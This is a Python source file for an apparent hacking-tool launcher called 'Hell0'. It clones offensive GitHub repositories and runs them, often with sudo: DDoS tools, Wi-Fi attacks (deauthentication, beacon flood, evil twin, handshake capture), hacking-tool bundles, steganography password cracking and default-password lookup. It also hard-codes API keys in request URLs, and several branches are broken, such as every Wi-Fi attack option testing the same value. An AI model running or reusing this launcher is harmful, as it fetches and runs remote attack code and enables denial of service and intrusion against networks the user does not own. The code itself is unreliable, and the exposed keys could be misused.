    ⣿⣿⡝⣿⣧⢿⣿⣿⣿⣿⣿⣿⢟⣯⡿⣫⣾⣿⣿⡇⠀⠀⠃⣽⡄⣼⠀⡄⠈⠀⠀⠁⠀⢠⠀⢠⡀⣴⠀⣾⠇⠀⠀⠀⣿⣿⣿⣮⣻⣮⡻⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣾⣿⣿
    ⣿⣿⣿⣞⢿⣷⡻⣿⡿⢟⣫⣵⣿⣿⣹⣿⣿⣿⣿⡇⠀⠀⠀⠈⠀⣿⠐⣿⢀⡆⣤⠀⣠⠈⠀⣼⠁⢻⣦⠉⠀⠀⠂⠀⣿⣿⣿⣿⣷⢻⣿⣷⣽⣻⠿⣿⡟⣵⣿⢯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣮⢿⣿⣕⢶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣧⠀⠀⡀⠀⡘⢥⠀⠛⢸⢇⣿⡀⣿⡆⠀⠙⠀⢸⠀⠀⠀⠀⠁⣸⣿⣿⣿⢿⣷⣶⣶⣶⣶⣶⣶⢦⣾⡿⣣⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣧⡹⣿⣧⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠘⡀⠀⠀⠀⠀⠈⠙⠀⠛⠁⠀⠀⠀⠀⢀⢣⠀⠈⢠⣿⣿⠋⠀⠀⠀⠉⢻⣿⣿⠟⣡⣿⠟⣹⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⣌⢻⣷⣼⣿⣿⠛⠛⢻⡟⣿⡟⢻⡗⠀⢀⠀⠐⣆⣄⠀⠀⠀⠀⠀⠀⡀⢀⠀⢀⠀⠂⠁⠀⡄⡘⠛⠃⠀⠊⠙⡗⠀⠀⠛⣡⣾⣿⣡⣾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣯⡳⢶⣯⣝⢿⣿⣿⡏⣆⡀⠄⡀⠇⠻⡆⢄⡀⠀⠀⠀⢀⠀⠣⡀⠡⠀⠀⠌⣰⣶⣿⣿⣦⠀⣠⣿⠆⢸⢸⡿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⢿⣷⣽⣻⢿⣮⣻⣧⣋⣶⠀⠠⠀⠘⠃⠘⠇⢹⠃⡿⠀⠀⠠⠘⢄⠀⠀⠈⠙⢏⣿⢟⣵⢟⢉⣷⠁⠀⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣻⢿⣿⣾⣽⣹⣿⡳⣷⠀⠐⡀⢂⠐⠀⡀⢀⠁⠠⠀⠀⡀⠄⠑⠀⠁⢀⠙⠧⣽⣾⣿⠟⠁⢀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⢿⣿⣿⣿⣿⣾⣽⢻⡿⢿⣿⣾⣯⣤⣄⡂⠌⠠⠐⠠⠈⠄⠁⠂⣀⡀⠀⠡⠐⡀⢀⠀⠄⠀⡀⠠⡀⢀⣾⠿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⢹⣿⣿⣿⡿⣱⡟⣽⣷⣮⢿⣟⢿⣛⣛⣿⣿⣿⣿⣿⣿⣿⣟⣛⣻⡧⣦⣄⣐⡀⠠⠈⠐⢀⣁⣴⡿⣵⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡟⣾⣿⡟⣵⣿⣷⣼⣿⣿⡿⣽⢟⣾⣿⣿⣿⣷⡻⣯⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣾⢏⣾⣿⣿⣿⡝⣷⡻⣿⣿⣷⣵⣿⣾⣽⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⢻⣿⣧⡻⣿⣿⣿⡿⣟⣾⢯⣾⣿⣿⣿⣿⣿⣷⡽⣷⡻⣿⣿⣿⣿⣿⣿⣿⣿⢯⣾⣫⣿⣿⣿⣿⣿⣿⣞⢿⣝⢿⣿⣿⣿⡿⣻⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣶⣯⣽⣾⣿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣝⣿⣿⣿⣿⣿⡿⣳⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣾⣭⣷⣿⣿⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣽⣟⣻⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣞⢿⣿⣿⡟⣵⡿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣿⣻⣿⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣯⣻⢟⣾⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⣷⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    """
    )


def clear_screen():
    subprocess.run("clear" if os.name == "posix" else "cls")


def gahhh():
    clear_screen()
    devil()
    devil()
    devil()
    devil()
    devil()
    devil()
    devil()
    clear_screen()
    time.sleep(0.5)
    print(colored("NOW LEAVING Hell0...", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(2)
    exit()


def pwnd():
    change()
    os.system("git clone https://github.com/Thr0wAway-n0w/pwnd.git")
    os.chdir("pwnd")
    os.system("git fetch")
    os.system("git pull")
    os.system("pipenv run python3 pwnd.py")
    main_menu()


def get_zipcodes_within_distance(zipcode, distance):
    api_url = f"https://www.zipcodeapi.com/rest/izWpWpWIjGWMm3p59jfXYW0wNltt2UoB4JbMxGo0juQx5CYekdtCG4vTTbNaNPSN/radius.json/{zipcode}/{distance}/mile"
    response = requests.get(api_url)
    data = response.json()
    zipcodes = data["zip_codes"]
    sorted_zipcodes = sorted(zipcodes, key=lambda x: x["distance"])
    return sorted_zipcodes


def colorize_distance(distance):
    if distance == 0:
        return "\033[97m"
    elif distance <= 10:
        return "\033[37m"
    elif distance <= 20:
        return "\033[90m"
    elif distance <= 30:
        return "\033[92m"
    elif distance <= 40:
        return "\033[93m"
    elif distance <= 50:
        return "\033[33m"
    elif distance < 60:
        return "\033[93m"
    elif distance < 70:
        return "\033[31m"
    elif distance < 80:
        return "\033[36m"
    else:
        return "\033[34m"


def geo_menu():
    clear_screen()
    ascii_banner()
    print(colored("Geo-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print("                      \033[91m1\033[0m)\033[90m ZipCodes")
    footer()
    option = input("> ")
    if option == "1":
        clear_screen()
        zip_menu()
        what_now()
    elif option == "BACK":
        main_menu()
    elif option == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        geo_menu()


def get_zip_details(zipcode):
    url = f"https://www.zipcodeapi.com/rest/QuwEnYrHY739Pt0cXLNf9rpITpOMljbGCelpkWalWL2PAPSySLbWcLDv05Zuwwnu/info.json/{zipcode}/radians"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        return None


def zip_menu():
    clear_screen()
    ascii_banner()
    print(colored("Zipcode-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print("\033[96mLIMIT DISTANCE OR USE YOUR OWN API KEY")
    print(" ")
    print("Select Option:")
    print("1) Find Nearby Zip codes")
    print("2) Indepth Scan")
    option = input("> ")

    if option == "1":
        print("Enter a ZIP CODE:")
        zipcode = input("> ")
        print("Enter the DISTANCE in miles:")
        distance = int(input("> "))
        zipcodes = get_zipcodes_within_distance(zipcode, distance)

        print("Zip codes within", distance, "miles of", zipcode, ":")
        for zip_info in zipcodes:
            print(
                colorize_distance(zip_info["distance"]),
                zip_info["zip_code"],
                "-",
                zip_info["distance"],
            )

    elif option == "2":
        print("Enter a ZIP CODE:")
        zipcode = input("> ")
        print("Enter the DISTANCE in miles:")
        distance = int(input("> "))
        zipcodes = get_zipcodes_within_distance(zipcode, distance)

    if zipcodes:
        print("Zip codes within", distance, "miles of", zipcode, ":")
        for zip_info in zipcodes:
            details = get_zip_details(zip_info["zip_code"])
            if details:
                print(
                    colorize_distance(zip_info["distance"]),
                    zip_info["zip_code"],
                    "-",
                    zip_info["distance"],
                )
                print("\tCity:", details["city"])
                print("\tState:", details["state"])
            else:
                print("Error: Zip details not found for", zip_info["zip_code"])
    else:
        print("Error: Zip codes data not found. Please check the input and try again.")

    if option == "1":
        return option
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        zip_menu()


def ddos_install():
    change()
    os.system("git clone https://github.com/HyukIsBack/KARMA-DDoS.git")
    os.chdir("KARMA-DDoS")
    os.system("git fetch")
    os.system("git pull")
    os.system(" pipenv run python3 -m pip install -r requirements.txt")
    os.system("sudo chmod +x ./setup.py")
    os.system("sudo pipenv run python3 ./setup.py install")
    os.system("pipenv run python3 main.py")


def send_command_to_xterms():
    command = simpledialog.askstring(
        "Enter Command",
        "Enter command to send to xterm windows (or type 'exit' to quit):",
    )
    global num_xterms
    processes = []
    for i in range(num_xterms):
        process = subprocess.Popen(
            [
                "xterm",
                "-e",
                "python3",
                "-c",
                f"import Hell0; Hell0.ddos_install(); {command}",
            ]
        )
        processes.append(process)

    for process in processes:
        process.communicate()

    print(f"Command '{command}' sent to all xterm windows.")


def isend_command_to_xterms():
    command = simpledialog.askstring(
        "Enter Command",
        "Enter command to send to xterm windows (or type 'exit' to quit):",
    )
    global num_xterms
    processes = []
    for i in range(num_xterms):
        process = subprocess.Popen(
            ["xterm", "-e", "pipenv", "run", "python3", "-c", f"import Hell0; Hell0.kicks(); {command}"]
        )
        processes.append(process)

    for process in processes:
        process.communicate()

    print(f"Command '{command}' sent to all xterm windows.")


def multi_menu():
    change()
    global num_xterms
    clear_screen()
    multi_banner()
    print(colored("Multi-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print(
        "    \033[91m1\033[0m)\033[90m SplitScreen Multi\033[95m Neat\033[97m and \033[95mContained\033[97m, produces \033[95m1 extra \033[97minstance by halving the terminal\033[0m"
    )
    print(" ")
    print(
        "    \033[91m2\033[0m)\033[90m Xterm Multi\033[91m Unlimited \033[97mQuantity, \033[91mEACH \033[97mgets it's \033[91mOWN UNIQUE Mac and IP Addresses"
    )
    print(" ")
    print(
        "  👹\033[92m3\033[0m)\033[91m ×͜× \033[97mDDoS Playground\033[91m ×͜× \033[95mOR\033[92m 3.0\033[0m GO \033[41mGORILLA MONSOON MODE\033[0m"
    )
    print(" ")
    print("    \033[93m4)\033[40m Run\033[0m")
    choice = input(">  ")

    if choice == "1":
        clear_screen()
        multi_mode()
        multi_major()
        time.sleep(10)
        clear_screen()
        main_menu()
    elif choice == "2":
        clear_screen()
        multi_manner()
        multi_multi()
    elif choice == "3":
        clear_screen()
        multi_manner()
        ddos_play()
    elif choice == "3.0":
        clear_screen()
        multi_manner()
        jam()
        ddos_play()
    elif choice == "4":
        clear_screen()
        ascii_banner()
        what_now()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        multi_menu()


def jam():
    print(
        colored(
            "ACTIVATING GORILLA MONSOON MODE...",
            "red",
            attrs=["reverse", "blink", "bold"],
        )
    )
    time.sleep(5)
    pyautogui.hotkey("ctrl", "shift", "d")
    time.sleep(1)
    pyautogui.typewrite("bb\n")
    time.sleep(1)
    pyautogui.typewrite("y\n")
    time.sleep(1)
    pyautogui.typewrite("8\n")


def split():
    pyautogui.hotkey("ctrl", "shift", "d")
    time.sleep(1)
    pyautogui.typewrite("pipenv run python3 Hell0.py\n")
    pyautogui.hotkey("ctrl", "shift", "d")
    time.sleep(1)
    pyautogui.typewrite("pipenv run python3 Hell0.py\n")
    pyautogui.hotkey("ctrl", "shift", "d")
    time.sleep(1)
    pyautogui.typewrite("pipenv run python3 Hell0.py\n")


def multi_mode():
    pyautogui.hotkey("ctrl", "shift", "d")
    time.sleep(0.01)
    pyautogui.typewrite("pipenv run python3 Hell0.py +1\n")


def multi_multi():
    clear_screen()
    multi_manner()
    print(
        "\033[0mThe First Four Instances are \033[92mPre-Postioned\033[0m. \033[91mDrag/drop\033[92m ⇘\033[0m for Your 5th Xterm"
    )

    global num_xterms
    num_xterms = 5
    os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))

    positions = [
        "center",
        "topright",
        "topleft",
        "bottomleft",
        "bottomright",
    ]

    for i in range(num_xterms):
        ip_address = f"192.168.1.{i + 9}"
        mac_address = f"00:11:22:33:44:5{i}"

        position = positions[i]

        if position == "center":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.main_menu()'\" &"
            )
            time.sleep(0.1)
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "topright":
            geometry = "80x24-0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.main_menu()'\" &"
            )
            time.sleep(0.1)
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "topleft":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.main_menu()'\" &"
            )
            time.sleep(0.1)
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "bottomleft":
            geometry = "80x24+0-0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.main_menu()'\" &"
            )
            time.sleep(0.1)
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "bottomright":
            geometry = "80x24-0-0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.main_menu()'\" &"
            )
            time.sleep(0.1)
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")

    root = tk.Tk()
    root.withdraw()
    command = simpledialog.askstring(
        " ", "COVER THIS WITH TOP LEFT XTERM (or type 'exit' to quit): "
    )
    exit_command = "exit"
    while True:
        if command and command != exit_command:
            send_command_to_xterms()
        else:
            change()
            main_menu()

    exit(0)


def ddos_play():
    clear_screen()
    multi_manner()
    print(
        "\033[0mThe First Four Instances are \033[92mPre-Postioned\033[0m. \033[91mDrag/drop\033[92m ⇘\033[0m for Your 5th Xterm"
    )

    global num_xterms
    num_xterms = 5
    os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))

    positions = [
        "center",
        "topright",
        "topleft",
        "bottomleft",
        "bottomright",
    ]

    for i in range(num_xterms):
        ip_address = f"192.168.1.{i + 9}"
        mac_address = f"00:11:22:33:44:5{i}"

        position = positions[i]

        if position == "center":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.ddos_install()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "topright":
            geometry = "80x24-0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.sql_attack()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "topleft":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.simba_menu()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "bottomleft":
            geometry = "80x24+0-0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.prox()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "bottomright":
            geometry = "80x24-0-0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.cyber()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
    root = tk.Tk()
    root.withdraw()
    command = simpledialog.askstring(
        " ", "COVER THIS WITH TOP LEFT XTERM (or type 'exit' to quit): "
    )
    exit_command = "exit"
    while True:
        if command and command != exit_command:
            send_command_to_xterms()
        else:
            change()
            main_menu()

    exit(0)


def what_now():
    print(colored("Where To?", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    print
    print(" ")
    print("\033[91m1\033[0m)\033[90m\033[0m Go Back to \033[41mHell\033[0m")
    print("\033[91m2\033[0m)\033[90m \033[31mGAHHH! IT BURNS!!!\033[0m")
    choice = input("YOU CHOOSE: ")

    if choice == "1":
        change()
        main_menu()
    elif choice == "2":
        gahhh()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        change()
        menu()


def mac():
    print(
        "\033[97mMAC ADDRESS\033[92m Find this in the eth0 section next to\033[94m Ether\033[95m"
    )
    os.system("ifconfig -a")


def essid_name():
    print("\033[97mESSID NAME\033[95m")
    os.system("iwgetid -r")


def access_point():
    print("\033[97mACCESS POINT\033[95m")
    os.system(
        "iwconfig wlan0 2> /dev/null | awk -F: '/Mode:/ {print $2}' | awk '{print $1}'"
    )


def essid_channel():
    print("\033[97mESSID CHANNEL\033[95m")
    os.system(
        "sudo iwlist wlan0 scanning essid ESSID | grep Channel | head -1 | awk -F: '{print $2}'"
    )


def gateway():
    print("\033[97mGATEWAY IP\033[95m")
    os.system("ip route | grep default")


def wlan():
    mac()
    essid_name()
    access_point()
    essid_channel()
    gateway()


def weelan():
    change()
    os.system("git clone https://github.com/Gurpreet06/Wifi-Crack.git")
    os.chdir("Wifi-Crack")
    os.system("pipenv install -r requirements.txt")
    clear_screen()
    ascii_banner()
    print(colored("CONFIGURE ATTACK VECTOR", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "\033[91mNETWORK INTERFACE \033[0m(\033[95mwlan0\033[0m or \033[95meth0\033[0m)"
    )
    nii = input("Selection: ")
    print("\033[91mESSID NAME\033[0m")
    ess = input("Selection: ")
    print("\033[91mCHANNEL\033[0m")
    chh = input("Selection: ")
    clear_screen()
    ascii_banner()
    print(colored("PICK YOUR POISON", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print("\033[91m1\033[0m)\033[90m Handshake\033[95m")
    print("\033[91m2\033[0m)\033[90m PKMID\033[95m")
    print("\033[91m3\033[0m)\033[90m AAuth\033[95m")
    print("\033[91m4\033[0m)\033[90m DAuth\033[95m")
    print("\033[91m5\033[0m)\033[90m BFlood\033[95m")
    print("\033[91m6\033[0m)\033[90m ETwin\033[95m")
    print(" ")
    print(
        colored(
            "Remember, All Required Information Can Be Found In Top Window",
            "yellow",
            attrs=["reverse", "blink"],
        )
    )
    time.sleep(3)
    choice = input("Pick Your Poison: ")
    if choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "Handshake")
    elif choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "PKMID")
    elif choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "AAuth")
    elif choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "DAuth")
    elif choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "BFlood")
    elif choice == "1":
        subprocess.run("sudo", "pipenv", "run", "python3", "wifiCrack.py", "-i", nii, "-m", "ETwin")
    else:
        change()
        print("ERROR...")
        main_menu()


def wi_die():
    print("\033[0mWiFi Attack")
    global num_xterms
    num_xterms = 5
    os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))

    positions = [
        "center",
        "topright",
        "topleft",
        "bottomleft",
        "bottomright",
    ]
    for i in range(num_xterms):
        ip_address = f"192.168.1.{i + 9}"
        mac_address = f"00:11:22:33:44:5{i}"

        position = positions[i]

        if position == "center":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.wlan()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")
        elif position == "topright":
            geometry = "80x24-0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.ipp()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")

    root = tk.Tk()
    root.withdraw()
    command = simpledialog.askstring(" ", "type START to Begin: ")
    exit_command = "START"
    while True:
        if command and command != exit_command:
            send_command_to_xterms()
        else:
            weelan()

    exit(0)


def kick():
    print("\033[0mKickThemOut")
    global num_xterms
    num_xterms = 5
    os.chdir(os.path.join(os.getenv("HOME"), "Desktop"))

    positions = [
        "center",
        "topright",
        "topleft",
        "bottomleft",
        "bottomright",
    ]
    for i in range(num_xterms):
        ip_address = f"192.168.1.{i + 9}"
        mac_address = f"00:11:22:33:44:5{i}"

        position = positions[i]

        if position == "center":
            geometry = "80x24+0+0"
            os.system(
                f"xterm -geometry {geometry} -hold -e \"pipenv run python3 -c 'import Hell0; Hell0.wlan()'\" &"
            )
            pyautogui.typewrite("1\n")
            time.sleep(0.03)
            pyautogui.typewrite("3\n")

    root = tk.Tk()
    root.withdraw()
    command = simpledialog.askstring(" ", "KICK THEM OUT or GO TO HELL: ")
    exit_command = "KICK THEM OUT"
    while True:
        if command and command != exit_command:
            what_now()
        else:
            kicks()

    exit(0)


def repo():
    clear_screen()
    ascii_banner()
    print(
        colored(
            "--------------------------------------------------------------------PLEASE NOTE--------------------------------------------------------------------",
            "yellow",
            attrs=["reverse", "blink", "bold"],
        )
    )
    time.sleep(3)
    clear_screen()
    ascii_banner()
    print(
        colored(
            "                                     ANY AND ALL TOOLS DOWNLOADED FROM HER WILL BE SAVED TO THE BORROWED TOOL FOLDER.                               ",
            "red",
            attrs=["reverse", "bold"],
        )
    )
    print(
        colored(
            "                                    ⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪⇪                                ",
            "yellow",
            attrs=["reverse", "bold"],
        )
    )
    time.sleep(4)
    print("1. Repo 1")
    print(" ")
    print("2. Repo 2")
    print(" ")
    print("3. FSociety")
    print(" ")
    choice = input("Select Repo: ")

    if choice == "1":
        change()
        os.system("git clone https://github.com/Thr0wAway-n0w/Borrowed2.git")
        os.chdir("Borrowed2")
        os.system("pipenv run python3 ch3r0.py")
        what_now()

    elif choice == "2":
        change()
        os.system("sudo apt install python2")
        os.system("sudo apt install 2to3") 
        os.system("git clone https://github.com/mishakorzik/AllHackingTools.git")
        os.chdir("AllHackingTools")
        os.system("sudo chmod +x Install.sh")
        os.system("bash ./Install.sh")
        os.system("pipenv run python2 MainMenu.py")
        what_now()

    if choice == "3":
        change()
        os.system("git clone https://github.com/fsociety-team/fsociety.git")
        os.chdir("fsociety")
        os.system("pipenv install fsociety")
        os.system("pipenv install --upgrade fsociety")
        os.system("pipenv install -e '.[dev]'")
        os.system("pipenv run python3 -m pip install -r requirements-dev.txt")
        os.system("pipenv run python3 setup.py install")
        os.system("fsociety")
        what_now()

    else:
        what_now()

def run_terminal_commands():
    protected_file = input("File to Protect: ")
    tripwire_file = input("Tripwire File: ")
    subprocess.run(["git", "clone", "https://github.com/vrikodar/Bullet"])
    os.chdir("Bullet")
    subprocess.run(["sudo", "chmod", "+x", "install.sh"])
    subprocess.run(["sudo", "bash", "install.sh"])
    subprocess.run(
        [
            "gnome-terminal",
            "pipenv run python3 dead.py",
            protected_file,
            "http://0.0.0.0:8080/",
            tripwire_file,
        ]
    )
    time.sleep(2)
    pyautogui.typewrite("pipenv run python3 dead.py ")
    pyautogui.typewrite(protected_file)
    pyautogui.typewrite(" http://0.0.0.0:8080/")
    pyautogui.typewrite(tripwire_file)


def run_http_server():
    subprocess.run(["pipenv run python3", "-m", "http.server", "8080"])


def deadman():
    clear_screen()
    ascii_banner()
    print(
        colored(
            "--------------------------------------PLEASE NOTE!--------------------------------------",
            "yellow",
            attrs=["reverse", "blink", "bold"],
        )
    )
    time.sleep(2)
    clear_screen()
    ascii_banner()
    header()
    print(
        colored(
            "BEFORE HITTING ENTER IN THE POP UP WINDOW, PUT YOUR CONFIDENTIAL FILE IN THE BULLET FOLDER",
            "red",
            attrs=["reverse", "bold"],
        )
    )
    time.sleep(3)
    print(
        colored(
            "----------YOUR TRIPWIRE FILE MUST GO ON THE DESKTOP. MODIFY AS YOU SEE FIT.----------",
            "red",
            attrs=["reverse", "bold"],
        )
    )
    time.sleep(3)
    run_terminal_commands()
    run_http_server()


def steg():
    change()
    os.system("sudo apt install stegseek")
    clear_screen()
    ascii_banner()
    print(colored("Crack Stegofile", "red", attrs=["reverse", "blink", "bold"]))
    header()
    print(
        "             \033[91m1\033[0m)\033[90m Seed                                                                      \033[91m2\033[0m)\033[90m Crack          "
    )
    footer()
    choice = input("Select Option: ")
    if choice == "1":
        print("StegFile Name")
        stfl = input("Name: ")
        print("Name of Output File of Extracted Data")
        opf = input("Output Name: ")
        subprocess.run(["stegseek", "--seed", stfl, opf])
        time.sleep(5)
        steg()
    elif choice == "2":
        print("StegFile Name")
        stfl = input("Name: ")
        print("Wordlist To Use")
        wrd = input("Wordlist: ")
        print("Name of Output File of Extracted Data")
        opf = input("Output Name: ")
        subprocess.run(["stegseek", "--crack", stfl, wrd, opf])
        time.sleep(5)
        steg()
    elif choice == "Seed":
        print(" ")
        print("\033[96mStegseek Seed Option")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mDetect and extract any unencrypted (meta) data from a steghide image":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        steg()
    elif choice == "Crack":
        print(" ")
        print("\033[96mStegseek Cracker Option")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mThis mode will simply try all passwords in the provided wordlist against the provided stegofile":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        steg()
    elif choice == "BACK":
        passw()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        steg()


def asslist():
    clear_screen()
    subprocess.run(["pass-station", "list"])
    print("1) Continue With Specific Search")
    print("2) Exit")
    select = input("Option: ")
    if select == "1":
        station()
    elif select == "2":
        what_now()
    else:
        print("INVALID SELECTION")
        time.sleep(2)
        passw()


def station():
    clear_screen()
    print("Default Password Search \033[91m ex. \033[92mapache\033[0m")
    psw = input("Search: ")
    clear_screen()
    subprocess.run(["pass-station", "search", psw])
    print("New Search? yes/no")
    choice = input("Selection: ")
    if choice == "yes":
        station()
    else:
        what_now()


def passw():
    change()
    clear_screen()
    ascii_banner()
    print(colored("PASSWORDS", "red", attrs=["reverse", "bold"]))
    header()
    print(
        "             \033[91m1\033[0m)\033[90m Pwnd                        \033[91m2\033[0m)\033[90m HashBreak                      \033[91m3\033[0m)\033[90m SecLists                      \033[91m4\033[0m)\033[90m Cupp                            "
    )
    print(
        "             \033[91m5\033[0m)\033[90m StegSeek                    \033[91m6\033[0m)\033[90m de Bruijn                      \033[91m7\033[0m)\033[90m Pass-Station                                   "
    )
    footer()
    choice = input("\033[97mSelect an option: ")
    if choice == "1":
        pwnd()
    elif choice == "2":
